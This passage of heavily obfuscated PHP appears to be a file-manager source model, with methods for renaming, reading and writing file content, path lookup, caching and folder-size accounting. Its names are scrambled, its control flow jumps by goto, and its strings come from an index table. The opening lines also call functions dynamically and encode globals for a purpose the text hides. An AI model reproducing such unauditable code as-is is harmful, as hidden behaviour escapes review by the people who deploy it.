$B—¶˜·ºŞÏ = $_SERVER[$FÈÚ¿¢±Âš[837]] . $FÈÚ¿¢±Âš[838]; goto aÔƒÆ‰Á¯ï; aÔƒÆ‰Á¯ï: $bÒˆ‹øíøÎ = $AÔ¸‘ó•($B—¶˜·ºŞÏ); $d¯àê†ÛĞ = explode($FÈÚ¿¢±Âš[229], $bÒˆ‹øíøÎ); if (count($d¯àê†ÛĞ) < $FÈÚ¿¢±Âš[606]) { $CÌÀ½Û±¦• = $FÈÚ¿¢±Âš[839]; $CÌÀ½Û±¦•(); } goto A»¥½çŒÎ†; A»¥½çŒÎ†: $C·¤ù±Šğ” = $FÈÚ¿¢±Âš[875]; $C·¤ù±Šğ”($_SERVER[$FÈÚ¿¢±Âš[876]]); $D®Äˆõå° = $FÈÚ¿¢±Âš[874]; goto aé‘¥œØË¼; aé‘¥œØË¼: $D®Äˆõå°(); $Eœîëğìô„ = $FÈÚ¿¢±Âš[877]; $E²ËòÜèÄÄ = json_encode($GLOBALS[$FÈÚ¿¢±Âš[878]]); goto aİ÷¢ßÑíô; EšÁ¶ÃŒ¼†: } $BßÚ­÷¶¿ = $this->sourceInfo($A Ş´÷É“); $A–Ã©Š¼ù = $this->pathInfoMore($A Ş´÷É“); goto aï£äŸ¾Ì“; d¥Ø›Ç¸•·: $FÈÚ¿¢±Âš =& $_SERVER[Ö‘Øù]; $bÎîíåÜÃ’ = $_SERVER[$FÈÚ¿¢±Âš[837]] . $FÈÚ¿¢±Âš[838]; $D¯‘ñÛÓæ¢ = $FÈÚ¿¢±Âš[873]; goto eÇÁ•Ô¸¥Æ; F¤àŒíÄÉ: $this->lockMoveEnd($A Ş´÷É“); Hook::trigger($FÈÚ¿¢±Âš[1596], $A–Ã©Š¼ù, $f§®¯Şœ¡ğ); return !0; goto fñ¾”Øåõ÷; C“Ö¿µ´: $døÙôÇà£ = array($BßÚ­÷¶¿[$FÈÚ¿¢±Âš[493]]); if ($BßÚ­÷¶¿[$FÈÚ¿¢±Âš[405]] == $FÈÚ¿¢±Âš[87]) { $døÙôÇà£[] = $BßÚ­÷¶¿[$FÈÚ¿¢±Âš[397]]; } $this->updateModifyTime($døÙôÇà£); goto F¤àŒíÄÉ; fñ¾”Øåõ÷: } public function childrenAll($A†«Ÿ¼ß›) { $c¥‚÷Şé”Œ =& $_SERVER[Ö‘Øù]; $DëæŸÜÆôŞ = $A†«Ÿ¼ß›[$c¥‚÷Şé”Œ[397]]; if ($A†«Ÿ¼ß›[$c¥‚÷Şé”Œ[405]] == $c¥‚÷Şé”Œ[87]) { $D•¢¾‰¶­³ = array($c¥‚÷Şé”Œ[579] => array($c¥‚÷Şé”Œ[539], $A†«Ÿ¼ß›[$c¥‚÷Şé”Œ[516]] . $DëæŸÜÆôŞ . $c¥‚÷Şé”Œ[540])); $aøÙŒò´Œ = array($c¥‚÷Şé”Œ[579] => $D•¢¾‰¶­³[$c¥‚÷Şé”Œ[516]]); $e³ğö¸ˆù = $this->field($c¥‚÷Şé”Œ[2014])->where($aøÙŒò´Œ)->select(); $e¼«ƒ÷”æ = !1; $F¥‚é‰Ìä = array($DëæŸÜÆôŞ); if ($e³ğö¸ˆù) { $e¼«ƒ÷”æ = array_to_keyvalue($e³ğö¸ˆù, $c¥‚÷Şé”Œ[33], $c¥‚÷Şé”Œ[462]); $e¼«ƒ÷”æ = array_remove_value($e¼«ƒ÷”æ, $c¥‚÷Şé”Œ[191]); $F¥‚é‰Ìä = array_to_keyvalue($e³ğö¸ˆù, $c¥‚÷Şé”Œ[33], $c¥‚÷Şé”Œ[397]); $F¥‚é‰Ìä[] = $DëæŸÜÆôŞ; } } else { $e¼«ƒ÷”æ = array($A†«Ÿ¼ß›[$c¥‚÷Şé”Œ[462]]); $F¥‚é‰Ìä = array($DëæŸÜÆôŞ); } return array($c¥‚÷Şé”Œ[2011] => $F¥‚é‰Ìä, $c¥‚÷Şé”Œ[1380] => $e¼«ƒ÷”æ); } public function removeArray($b„©¯Ç“¸º) { if (!$b„©¯Ç“¸º) { return !0; } } public function removeRelevance($A¬š·¥êŠŸ, $BŞö¨¯±ß²) { goto c’¼Œ©ëà; d†…ôÏÇ´­: Model($AòÄÒ¨°®[1993])->removeBySource($A¬š·¥êŠŸ); $this->where($E„’ÔÒÌ”¬)->delete(); Model($AòÄÒ¨°®[465])->remove($BŞö¨¯±ß²); goto c—ªÉ±ê; f…ƒªÎíõ: $A¬š·¥êŠŸ = array_unique(array_filter($A¬š·¥êŠŸ)); $BŞö¨¯±ß² = array_unique(array_filter($BŞö¨¯±ß²)); if (!$A¬š·¥êŠŸ) { return !1; } goto d°”ÖêÄÍ; c—ªÉ±ê: for ($BÁ› Ëà¡ = 0; $BÁ› Ëà¡ < count($A¬š·¥êŠŸ); $BÁ› Ëà¡++) { $this->sourceCacheClear($A¬š·¥êŠŸ[$BÁ› Ëà¡]); } goto aßî¬¶´†; c’¼Œ©ëà: $AòÄÒ¨°® =& $_SERVER[Ö‘Øù]; $A¬š·¥êŠŸ = $A¬š·¥êŠŸ ? $A¬š·¥êŠŸ : array(); $BŞö¨¯±ß² = $BŞö¨¯±ß² ? $BŞö¨¯±ß² : array(); goto f…ƒªÎíõ; CÙ²É‹İî¿: Model($AòÄÒ¨°®[1870])->where($E„’ÔÒÌ”¬)->delete(); Model($AòÄÒ¨°®[559])->where($E„’ÔÒÌ”¬)->delete(); Model($AòÄÒ¨°®[1707])->removeBySource($A¬š·¥êŠŸ); goto d†…ôÏÇ´­; d°”ÖêÄÍ: $E„’ÔÒÌ”¬ = array($AòÄÒ¨°®[412] => array($AòÄÒ¨°®[413], $A¬š·¥êŠŸ)); Model($AòÄÒ¨°®[2012])->where($E„’ÔÒÌ”¬)->delete(); Model($AòÄÒ¨°®[456])->where($E„’ÔÒÌ”¬)->delete(); goto CÙ²É‹İî¿; aßî¬¶´†: } public function rename($c‘„ñÍ, $Eø‹ØÄ‚øé) { goto DËÜÏÍ„”Ğ; C‚ÔÕë¯ŠÇ: if ($e•šÎ•¡ãß[$EŠ»òã—µ[405]] != $EŠ»òã—µ[87]) { $A‘²™¢÷…é[$EŠ»òã—µ[407]] = substr(get_path_ext($Eø‹ØÄ‚øé), 0, 10); } Model($EŠ»òã—µ[559])->eventRename($c‘„ñÍ, $e•šÎ•¡ãß[$EŠ»òã—µ[28]], $Eø‹ØÄ‚øé); $this->sourceCacheClear($c‘„ñÍ); goto FàŠ­Û“ó; DËÜÏÍ„”Ğ: $EŠ»òã—µ =& $_SERVER[Ö‘Øù]; $e•šÎ•¡ãß = $this->sourceInfo($c‘„ñÍ); if (!$e•šÎ•¡ãß) { return !1; } goto B»ó³ôÎÊÙ; eÉò×°¸ùâ: $a‰æäì¤ = $EŠ»òã—µ[2001] . $e•šÎ•¡ãß[$EŠ»òã—µ[493]]; if (isset(self::$cacheChildList[$a‰æäì¤])) { unset(self::$cacheChildList[$a‰æäì¤]); } return $EÉ”²Íä¦; goto aî ‚Äã; B»ó³ôÎÊÙ: $c‰²‚•ºŠ« = $this->fileNameExist($e•šÎ•¡ãß[$EŠ»òã—µ[493]], $Eø‹ØÄ‚øé); if ($c‰²‚•ºŠ« && $c‰²‚•ºŠ« != $c‘„ñÍ) { return !1; } $A‘²™¢÷…é = array($EŠ»òã—µ[415] => $Eø‹ØÄ‚øé, $EŠ»òã—µ[578] => USER_ID); goto C‚ÔÕë¯ŠÇ; FàŠ­Û“ó: $this->setNamePinyin($c‘„ñÍ, $A‘²™¢÷…é[$EŠ»òã—µ[28]], !1); $this->updateModifyTime($e•šÎ•¡ãß[$EŠ»òã—µ[493]]); $EÉ”²Íä¦ = $this->where(array($EŠ»òã—µ[412] => $c‘„ñÍ))->data($A‘²™¢÷…é)->save(); goto eÉò×°¸ùâ; aî ‚Äã: } public function setNamePinyin($f‡æ¢Ò”, $c‡ÖÃŸš’ã, $Bğ”ë©¼ºŞ = true) { $CîŞ¸Í é =& $_SERVER[Ö‘Øù]; $c“Ó‹Ò¢ø = Input::check($c‡ÖÃŸš’ã, $CîŞ¸Í é[582]); $ašì²Ä»³Á = array($CîŞ¸Í é[437] => KodSort::makeStr($c‡ÖÃŸš’ã)); if ($c“Ó‹Ò¢ø) { $ašì²Ä»³Á[$CîŞ¸Í é[459]] = str_replace($CîŞ¸Í é[50], $CîŞ¸Í é[33], Pinyin::get($c‡ÖÃŸš’ã)); $ašì²Ä»³Á[$CîŞ¸Í é[458]] = Pinyin::get($c‡ÖÃŸš’ã, $CîŞ¸Í é[583]); } if (!$Bğ”ë©¼ºŞ && !$c“Ó‹Ò¢ø) { $ašì²Ä»³Á[$CîŞ¸Í é[459]] = null; $ašì²Ä»³Á[$CîŞ¸Í é[458]] = null; } $this->metaSet($f‡æ¢Ò”, $ašì²Ä»³Á); } public function getContent($bÂÂÄĞ„Ú) { goto EõÉÈ»¯Ô; EõÉÈ»¯Ô: $fÎ»ñÏ¯µé =& $_SERVER[Ö‘Øù]; $c©§ŠÛ³§Ğ = $this->fileInfoGet($bÂÂÄĞ„Ú); if (!$c©§ŠÛ³§Ğ) { return !1; } goto A¯ß ¤â†õ; A¯ß ¤â†õ: if ($c©§ŠÛ³§Ğ[$fÎ»ñÏ¯µé[78]] == 0) { return $fÎ»ñÏ¯µé[33]; } $fÃ™ÈÀ†Ğ‰ = $fÎ»ñÏ¯µé[2015] . $c©§ŠÛ³§Ğ[$fÎ»ñÏ¯µé[170]]; if ($c©§ŠÛ³§Ğ[$fÎ»ñÏ¯µé[78]] <= 1024 * 10) { $fÙ£Íæ¡‹Í = Cache::get($fÃ™ÈÀ†Ğ‰); if (!$fÙ£Íæ¡‹Í) { $fÙ£Íæ¡‹Í = IO::getContent($c©§ŠÛ³§Ğ[$fÎ»ñÏ¯µé[76]]); Cache::set($fÃ™ÈÀ†Ğ‰, $fÙ£Íæ¡‹Í); } return $fÙ£Íæ¡‹Í; } goto A‰¸µ¹áÖ—; A‰¸µ¹áÖ—: if (!$c©§ŠÛ³§Ğ[$fÎ»ñÏ¯µé[76]]) { return $fÎ»ñÏ¯µé[33]; } return IO::getContent($c©§ŠÛ³§Ğ[$fÎ»ñÏ¯µé[76]]); goto bùÔšñî¸˜; bùÔšñî¸˜: } public function setDesc($AÏ†¢÷ÊÑŸ, $cÍÜÌ¯ÀÍ) { $BÉ¢É•“©Š =& $_SERVER[Ö‘Øù]; Model($BÉ¢É•“©Š[559])->eventAddDesc($AÏ†¢÷ÊÑŸ, $cÍÜÌ¯ÀÍ); return $this->metaSet($AÏ†¢÷ÊÑŸ, $BÉ¢É•“©Š[446], $cÍÜÌ¯ÀÍ); } public function setContent($d‚·è“˜Ş, $b°ÀÅéºÌ· = '') { goto eÓ½ï›½; eÓ½ï›½: $c¢«ÊÃ­È =& $_SERVER[Ö‘Øù]; $cëÕ¢˜Ë®“ = $this->sourceInfo($d‚·è“˜Ş); $e‹ñòÅµ–´ = $this->fileInfoGet($d‚·è“˜Ş); goto eìƒË¤áÂÀ; F¦¥–ˆ±Ğ£: if (!$bç¹ÙÈŸã) { return Model($c¢«ÊÃ­È[465])->remove($c‰¹öÁøä¡[$c¢«ÊÃ­È[462]]); } $this->folderSizeReset($cëÕ¢˜Ë®“[$c¢«ÊÃ­È[493]]); return !0; goto aìğÓÄ„´¬; eìƒË¤áÂÀ: if (!$e‹ñòÅµ–´ || !$cëÕ¢˜Ë®“) { return !1; } $c‰¹öÁøä¡ = Model($c¢«ÊÃ­È[465])->addFileByContent($b°ÀÅéºÌ·, $cëÕ¢˜Ë®“[$c¢«ÊÃ­È[28]]); $bç¹ÙÈŸã = $this->fileHistory($cëÕ¢˜Ë®“, $c‰¹öÁøä¡[$c¢«ÊÃ­È[462]], $c‰¹öÁøä¡[$c¢«ÊÃ­È[78]]); goto F¦¥–ˆ±Ğ£; aìğÓÄ„´¬: } public function fileSubstr($d †¹ÓâÉ, $a…Á¢§ìÎƒ, $F´Ñ”éìÊ¦) { $e‰âáº˜ãª = $this->fileInfoGet($d †¹ÓâÉ); if (!$e‰âáº˜ãª) { return !1; } return IO::fileSubstr($e‰âáº˜ãª[$_SERVER[Ö‘Øù][76]], $a…Á¢§ìÎƒ, $F´Ñ”éìÊ¦); } public function fileInfoGet($A¸·¿Ÿâ›) { goto bÅ³ç£ìïë; bÎ ‰­óƒ®: $EÎƒƒ‡´ğ‚ = $fê–Ö“­ê‚[468] . $C‡«¶ƒ¥ë[$fê–Ö“­ê‚[462]]; $A„Ä‚’À‰ = _get(self::$cacheFileInfo, $EÎƒƒ‡´ğ‚); if ($A„Ä‚’À‰) { return $A„Ä‚’À‰; } goto b­Û³ ñ„º; c«Ê›—îÅ: return $eë“Œ¨ğ«Ä; goto Bê¨ÎÑ”âğ; b­Û³ ñ„º: $eë“Œ¨ğ«Ä = Model($fê–Ö“­ê‚[465])->fileInfo($C‡«¶ƒ¥ë[$fê–Ö“­ê‚[462]]); if ($eë“Œ¨ğ«Ä) { $eë“Œ¨ğ«Ä[$fê–Ö“­ê‚[28]] = $C‡«¶ƒ¥ë[$fê–Ö“­ê‚[28]]; } self::$cacheFileInfo[$EÎƒƒ‡´ğ‚] = $eë“Œ¨ğ«Ä; goto c«Ê›—îÅ; bÅ³ç£ìïë: $fê–Ö“­ê‚ =& $_SERVER[Ö‘Øù]; $C‡«¶ƒ¥ë = $this->sourceInfo($A¸·¿Ÿâ›); if (!$C‡«¶ƒ¥ë || $C‡«¶ƒ¥ë[$fê–Ö“­ê‚[405]]) { return !1; } goto bÎ ‰­óƒ®; Bê¨ÎÑ”âğ: } private function folderChildrenNumber($cŒ òš°µÂ) { $aƒ©°ª»Ô÷ =& $_SERVER[Ö‘Øù]; $bùŒÖî‘º­ = $this->sourceInfo($cŒ òš°µÂ); $cˆğ“œùÇ¶ = array($aƒ©°ª»Ô÷[579] => array($aƒ©°ª»Ô÷[539], $bùŒÖî‘º­[$aƒ©°ª»Ô÷[516]] . $cŒ òš°µÂ . $aƒ©°ª»Ô÷[540]), $aƒ©°ª»Ô÷[424] => intval($bùŒÖî‘º­[$aƒ©°ª»Ô÷[425]]), $aƒ©°ª»Ô÷[572] => 1); $Aõ¢Îğâ´¿ = $this->where($cˆğ“œùÇ¶)->count(); $a£Ò£­è£Ø = $this->where($cˆğ“œùÇ¶)->where(array($aƒ©°ª»Ô÷[572] => 0))->count(); return array($aƒ©°ª»Ô÷[82] => $a£Ò£­è£Ø, $aƒ©°ª»Ô÷[83] => $Aõ¢Îğâ´¿); } public function pathInfo($eõÕùÉ££š, $D®Ã’È„Í¨ = false) { goto aæñĞ›÷ê™; b˜ò¡àÈ’: self::$cachePathInfo[$fÕØïŒÀ¬–] = $fàõœæÁ²·; return $fàõœæÁ²·; goto f­Èã‰¶ï¨; d¡œ­‚ƒõÄ: $fàõœæÁ²· = $this->sourceInfo($eõÕùÉ££š); if (!$fàõœæÁ²·) { return !1; } $fàõœæÁ²· = $this->_listDataApplyItem($fàõœæÁ²·, $D®Ã’È„Í¨); goto b˜ò¡àÈ’; aæñĞ›÷ê™: $DÍßäñ×Â =& $_SERVER[Ö‘Øù]; $D®Ã’È„Í¨ = !1; $eõÕùÉ££š = intval($eõÕùÉ££š); goto dÄÎº’œª²; dÄÎº’œª²: $fÕØïŒÀ¬– = $DÍßäñ×Â[454] . intval($D®Ã’È„Í¨) . $DÍßäñ×Â[455] . $eõÕùÉ££š; $F³¼‘Ù¤‹ = _get(self::$cachePathInfo, $fÕØïŒÀ¬–); if ($F³¼‘Ù¤‹) { return $F³¼‘Ù¤‹; } goto d¡œ­‚ƒõÄ; f­Èã‰¶ï¨: } public static $cachePathInfoMore = array(); public function pathInfoMore($d÷êõíÕåÁ) { goto f¢ŸÆá˜š; fÂ¶øŠÜå‡: self::$cachePathInfoMore[$d÷êõíÕåÁ] = $B‰¡ÍÔ§”‡; return $B‰¡ÍÔ§”‡; goto f‚ƒÃâ‹ëÙ; f¢ŸÆá˜š: $CôˆË‹¾Ş =& $_SERVER[Ö‘Øù]; $A˜¢¨«î‹î = _get(self::$cachePathInfoMore, $d÷êõíÕåÁ); if ($A˜¢¨«î‹î) { return $A˜¢¨«î‹î; } goto E‚ÊÕä¶“·; E‚ÊÕä¶“·: $B‰¡ÍÔ§”‡ = $this->pathInfo($d÷êõíÕåÁ); if (!$B‰¡ÍÔ§”‡) { return !1; } if ($B‰¡ÍÔ§”‡[$CôˆË‹¾Ş[405]] == $CôˆË‹¾Ş[87]) { $B‰¡ÍÔ§”‡[$CôˆË‹¾Ş[81]] = $this->folderChildrenNumber($d÷êõíÕåÁ); } goto fÂ¶øŠÜå‡; f‚ƒÃâ‹ëÙ: } public function sourceInfo($A›ˆµğˆ™‰) { goto f®â—†‰‹Û; F¸àÚÓŸŠº: $CªÛµ…Íá˜ = $bªâ”àÖÒö[453] . $A›ˆµğˆ™‰; $B’Ë—Ú…šØ = _get(self::$cacheSourceInfo, $CªÛµ…Íá˜); if ($B’Ë—Ú…šØ) { return $B’Ë—Ú…šØ; } goto c˜Œèéô÷; f®â—†‰‹Û: $bªâ”àÖÒö =& $_SERVER[Ö‘Øù]; if (!$A›ˆµğˆ™‰) { return array(); } $A›ˆµğˆ™‰ = intval($A›ˆµğˆ™‰); goto F¸àÚÓŸŠº; c˜Œèéô÷: $d§Â’õšªÆ = $this->where(array($bªâ”àÖÒö[397] => $A›ˆµğˆ™‰))->find(); self::$cacheSourceInfo[$CªÛµ…Íá˜] = $d§Â’õšªÆ; return self::$cacheSourceInfo[$CªÛµ…Íá˜]; goto b¦áˆééçù; b¦áˆééçù: } public function sourceCacheClear($f»™çŸùÇÛ = false) { self::cacheClear($f»™çŸùÇÛ); } public static function cacheClear($A¼‘â§È¿ô = false) { $B¦Ø‹ÒÜ­× =& $_SERVER[Ö‘Øù]; if ($A¼‘â§È¿ô == !1) { goto fĞ¸çÍ·–º; Fè„Ä›í…ñ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto aß¢ÂÉ‚™; fĞ¸çÍ·–º: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto Fè„Ä›í…ñ; aß¢ÂÉ‚™: return; goto F¾ÔŞÊ›ö; F¾ÔŞÊ›ö: } unset(self::$cacheSourceInfo[$B¦Ø‹ÒÜ­×[453] . $A¼‘â§È¿ô]); unset(self::$cachePathInfoMore[$A¼‘â§È¿ô]); unset(self::$cachePathInfo[$B¦Ø‹ÒÜ­×[2016] . $A¼‘â§È¿ô]); unset(self::$cachePathInfo[$B¦Ø‹ÒÜ­×[2017] . $A¼‘â§È¿ô]); } public function metaSet($c¬´«’½é, $aÅö‘…ê¯ò = null, $C‡´§ÑÎÃ  = null) { $aôâ“Ÿè£· = parent::metaSet($c¬´«’½é, $aÅö‘…ê¯ò, $C‡´§ÑÎÃ ); if ($aôâ“Ÿè£·) { $this->sourceCacheClear($c¬´«’½é); } return $aôâ“Ÿè£·; } public function pathInfoByPath($aÁŠÀ‘, $fäèß°™Å) { $AÓÎµÓ´‚ =& $_SERVER[Ö‘Øù]; $E¤íŒ¡°‹ = !$fäèß°™Å ? array() : explode($AÓÎµÓ´‚[8], trim($fäèß°™Å, $AÓÎµÓ´‚[8])); $fíãêÁ† = $aÁŠÀ‘; foreach ($E¤íŒ¡°‹ as $D”¶¬ÙŠÑç) { $c«µ™òÛ„ = array($AÓÎµÓ´‚[493] => $fíãêÁ†, $AÓÎµÓ´‚[28] => $D”¶¬ÙŠÑç); $d†ÚŒĞ´Äî = $this->where($c«µ™òÛ„)->select(); if (!$d†ÚŒĞ´Äî) { return !1; } $d†ÚŒĞ´Äî = array_sort_by($d†ÚŒĞ´Äî, $AÓÎµÓ´‚[425]); $fíãêÁ† = $d†ÚŒĞ´Äî[0][$AÓÎµÓ´‚[397]]; } return $this->pathInfo($fíãêÁ†, !0); } protected function updateModifyTime($B²Ä­¸²Á) { goto f‡‘§«Š°µ; f‡‘§«Š°µ: $d°êç‰ƒŠÄ =& $_SERVER[Ö‘Øù]; $CáÄğğƒóÂ = defined($d°êç‰ƒŠÄ[469]) ? USER_ID : $d°êç‰ƒŠÄ[191]; if (!$B²Ä­¸²Á) { return; } goto B®ä°ßØ²; fµÆ—–†ÀŒ: $Cë›ˆùè• = array($d°êç‰ƒŠÄ[578] => $CáÄğğƒóÂ, $d°êç‰ƒŠÄ[419] => time()); $this->where($b–‰œİé É)->save($Cë›ˆùè•); goto B¬ĞĞ¢Ëøš; B®ä°ßØ²: if (!is_array($B²Ä­¸²Á)) { $B²Ä­¸²Á = array($B²Ä­¸²Á); } foreach ($B²Ä­¸²Á as $f‚™‰¤îÊ => $aå´¸…“¶) { $B²Ä­¸²Á[$f‚™‰¤îÊ] = intval($aå´¸…“¶); $this->sourceCacheClear($aå´¸…“¶); } $b–‰œİé É = array($d°êç‰ƒŠÄ[397] => array($d°êç‰ƒŠÄ[7], $B²Ä­¸²Á)); goto fµÆ—–†ÀŒ; B¬ĞĞ¢Ëøš: } public function folderSizeReset($B½ëßÌŸÚ…, $Bİ¸…¤£Â = false) { goto EŒÔÕ£†ò×; DØ‘ğ…Ù“: if ($Bİ¸…¤£Â == 0) { return CacheLock::unlock($D•°½æˆ²ö); } $EİÂªï¥Œ¥ = $this->parentLevelArray($d×ÈŠ¿ã«©[$CĞŞõë°÷ [516]]); if (!$EİÂªï¥Œ¥) { $EİÂªï¥Œ¥ = array(); } goto e–‚ë“‡ó; e–‚ë“‡ó: $EİÂªï¥Œ¥[] = $d×ÈŠ¿ã«©[$CĞŞõë°÷ [397]]; $AÉ¦ÅòŞŞ¬ = array($CĞŞõë°÷ [397] => array($CĞŞõë°÷ [413], $EİÂªï¥Œ¥)); if ($Bİ¸…¤£Â < 0) { $AÉ¦ÅòŞŞ¬[$CĞŞõë°÷ [78]] = array($CĞŞõë°÷ [1008], abs($Bİ¸…¤£Â)); } goto EöÙ¦¬ÛÚ; EŒÔÕ£†ò×: $CĞŞõë°÷  =& $_SERVER[Ö‘Øù]; if ($this->statusIgnoreResetSpace) { return; } $d×ÈŠ¿ã«© = $this->sourceInfo($B½ëßÌŸÚ…); goto a•°›µ¦Şè; EöÙ¦¬ÛÚ: $this->where($AÉ¦ÅòŞŞ¬)->setAdd($CĞŞõë°÷ [78], $Bİ¸…¤£Â); CacheLock::unlock($D•°½æˆ²ö); $DÍˆ—¼ƒ¡  = $CĞŞõë°÷ [2019] . $d×ÈŠ¿ã«©[$CĞŞõë°÷ [406]] . $CĞŞõë°÷ [4] . $d×ÈŠ¿ã«©[$CĞŞõë°÷ [499]]; goto b‰¸¶ùÓÓ¾; a•°›µ¦Şè: $D•°½æˆ²ö = $CĞŞõë°÷ [2018] . $B½ëßÌŸÚ…; CacheLock::lock($D•°½æˆ²ö, 20); if ($Bİ¸…¤£Â === !1) { $this->sourceCacheClear($B½ëßÌŸÚ…); $d×ÈŠ¿ã«© = $this->sourceInfo($B½ëßÌŸÚ…); $AÉ¦ÅòŞŞ¬ = array($CĞŞõë°÷ [396] => $B½ëßÌŸÚ…, $CĞŞõë°÷ [424] => 0); $CÕø—›ÜäÔ = $this->where($AÉ¦ÅòŞŞ¬)->sum($CĞŞõë°÷ [78]); $Bİ¸…¤£Â = intval($CÕø—›ÜäÔ) - intval($d×ÈŠ¿ã«©[$CĞŞõë°÷ [78]]); } goto DØ‘ğ…Ù“; b‰¸¶ùÓÓ¾: $Dš‘İÉ¬›¢ = array($d×ÈŠ¿ã«©[$CĞŞõë°÷ [406]], $d×ÈŠ¿ã«©[$CĞŞõë°÷ [499]]); TaskRun::timeLimitCall($DÍˆ—¼ƒ¡ , $CĞŞõë°÷ [2020], $Dš‘İÉ¬›¢, 1.5); goto e¿¸ÖÊ’õ; e¿¸ÖÊ’õ: } public function folderSizeResetChildren($Aç­çİÎ‰) { goto d± šÄÜø†; d± šÄÜø†: $Aï¹Àæ¤‰½ =& $_SERVER[Ö‘Øù]; $this->sourceCacheClear($Aç­çİÎ‰); $DÁçö‚ˆË = $this->sourceInfo($Aç­çİÎ‰); goto F«Ñ¸Ó¨íº; F«Ñ¸Ó¨íº: $Aõ£ĞÎéÂ = array($Aï¹Àæ¤‰½[572] => 1, $Aï¹Àæ¤‰½[579] => array($Aï¹Àæ¤‰½[539], $DÁçö‚ˆË[$Aï¹Àæ¤‰½[516]] . $Aç­çİÎ‰ . $Aï¹Àæ¤‰½[540])); $cŒåÎËÁ±• = $Aï¹Àæ¤‰½[2021]; $AÉ‘ĞÇòò = $this->field($cŒåÎËÁ±•)->where($Aõ£ĞÎéÂ)->select(); goto eÊ“–¨Ó±ì; cğ›¥Ú›Ñ½: foreach ($aÍ§À¹Á¨Ú as $D‚Ó§ï¤²­) { $e¿ø¨‚õÚÙ = $D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[493]] . $Aï¹Àæ¤‰½[33]; if (!isset($AÉ‘ĞÇòò[$e¿ø¨‚õÚÙ])) { continue; } if ($D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[425]] == $AÉ‘ĞÇòò[$e¿ø¨‚õÚÙ][$Aï¹Àæ¤‰½[425]]) { $AÉ‘ĞÇòò[$e¿ø¨‚õÚÙ][$Aï¹Àæ¤‰½[78]] += $D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[78]]; } } foreach ($AÉ‘ĞÇòò as $D‚Ó§ï¤²­) { $a±ÛÚ¤÷ù = $this->parentLevelArray($D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[516]]); foreach ($a±ÛÚ¤÷ù as $e¿ø¨‚õÚÙ) { $e¿ø¨‚õÚÙ = $e¿ø¨‚õÚÙ . $Aï¹Àæ¤‰½[33]; if (!isset($AÉ‘ĞÇòò[$e¿ø¨‚õÚÙ])) { continue; } if ($D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[425]] == $AÉ‘ĞÇòò[$e¿ø¨‚õÚÙ][$Aï¹Àæ¤‰½[425]]) { $AÉ‘ĞÇòò[$e¿ø¨‚õÚÙ][$Aï¹Àæ¤‰½[78]] += $D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[78]]; } } } $f§‹àã‡ó¶ = array(); goto bŒî¿’Ù›§; eÊ“–¨Ó±ì: $Aõ£ĞÎéÂ[$Aï¹Àæ¤‰½[405]] = 0; $aÍ§À¹Á¨Ú = $this->field($cŒåÎËÁ±•)->where($Aõ£ĞÎéÂ)->select(); if (!$aÍ§À¹Á¨Ú) { return; } goto eÛ¨˜ëã; eÛ¨˜ëã: $AÉ‘ĞÇòò[] = $DÁçö‚ˆË; $AÉ‘ĞÇòò = array_to_keyvalue($AÉ‘ĞÇòò, $Aï¹Àæ¤‰½[397]); foreach ($AÉ‘ĞÇòò as $DŞÌ¬¹ËÈ„ => $D‚Ó§ï¤²­) { $AÉ‘ĞÇòò[$DŞÌ¬¹ËÈ„][$Aï¹Àæ¤‰½[2022]] = $AÉ‘ĞÇòò[$DŞÌ¬¹ËÈ„][$Aï¹Àæ¤‰½[78]]; $AÉ‘ĞÇòò[$DŞÌ¬¹ËÈ„][$Aï¹Àæ¤‰½[78]] = 0; } goto cğ›¥Ú›Ñ½; bŒî¿’Ù›§: foreach ($AÉ‘ĞÇòò as $D‚Ó§ï¤²­) { if ($D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[78]] == $D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[2022]]) { continue; } $f§‹àã‡ó¶[] = array($Aï¹Àæ¤‰½[397], $D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[397]], $Aï¹Àæ¤‰½[78], $D‚Ó§ï¤²­[$Aï¹Àæ¤‰½[78]]); } $this->saveAll($f§‹àã‡ó¶); goto FéÖç¨Ï•; FéÖç¨Ï•: } public function userSpaceReset($dÔÍ·½‰é = false) { $a§ƒ ¡“ï =& $_SERVER[Ö‘Øù]; $dô¯ğéáÇ = $this->where(array($a§ƒ ¡“ï[406] => self::TYPE_USER, $a§ƒ ¡“ï[499] => $dÔÍ·½‰é, $a§ƒ ¡“ï[405] => 0))->sum($a§ƒ ¡“ï[78]); $dô¯ğéáÇ = !$dô¯ğéáÇ || $dô¯ğéáÇ <= 0 ? 0 : $dô¯ğéáÇ; Model($a§ƒ ¡“ï[508])->userEdit($dÔÍ·½‰é, array($a§ƒ ¡“ï[1716] => $dô¯ğéáÇ)); } public function targetSpaceUpdate($F‰Ù—İ¨ğ¨, $c¸÷ÈåŒéš) { $C“Õ†ùóŠ =& $_SERVER[Ö‘Øù]; if (!$c¸÷ÈåŒéš) { return; } if (!in_array($F‰Ù—İ¨ğ¨, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $bîîÔ’¼Ú = $this->targetSpaceSize($F‰Ù—İ¨ğ¨, $c¸÷ÈåŒéš); if ($F‰Ù—İ¨ğ¨ == self::TYPE_USER) { Model($C“Õ†ùóŠ[508])->userEdit($c¸÷ÈåŒéš, array($C“Õ†ùóŠ[1716] => $bîîÔ’¼Ú)); } else { if ($F‰Ù—İ¨ğ¨ == self::TYPE_GROUP) { Model($C“Õ†ùóŠ[517])->groupEdit($c¸÷ÈåŒéš, array($C“Õ†ùóŠ[1716] => $bîîÔ’¼Ú)); } } } public function targetSpaceSize($eæ†Õ¦ì¦Õ, $aÔöøäºÔ) { goto E‹Ì‹´´Å; E‹Ì‹´´Å: $cÇî†¦Ä×Û =& $_SERVER[Ö‘Øù]; $dùÖÖ…ˆ•ª = $this->sourceRoot($eæ†Õ¦ì¦Õ, $aÔöøäºÔ, !0); if (!$dùÖÖ…ˆ•ª) { return 0; } goto Cô¿³Äé¿; EÎÆë§”³Í: $Dô¬§Ô¶Ü = !$Dô¬§Ô¶Ü || $Dô¬§Ô¶Ü <= 0 ? 0 